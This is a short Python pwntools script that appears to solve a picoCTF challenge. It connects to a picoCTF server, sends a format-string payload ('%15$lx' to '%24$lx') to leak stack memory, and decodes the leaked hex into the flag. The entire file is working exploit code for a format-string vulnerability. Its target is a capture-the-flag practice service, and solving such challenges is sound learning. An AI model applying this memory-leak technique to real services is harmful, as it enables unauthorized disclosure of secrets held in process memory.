#!/usr/bin/env python3

from pwn import *
from binascii import unhexlify

p = remote("mercury.picoctf.net", 16439)

offset = 15
payload = ''
flag = b''

for idx in range(offset, 25):
    payload += f"%{idx}$lx"

p.sendline(str(1))
sleep(0.2)
p.sendline(payload)
p.recvuntil(":\n")
answer = p.recvline().decode().strip("\n")

for i in range(int(len(answer) / 8)):
    flag += unhexlify(answer[i * 8 : i * 8 + 8])[::-1]

print(flag)

p.interactive()
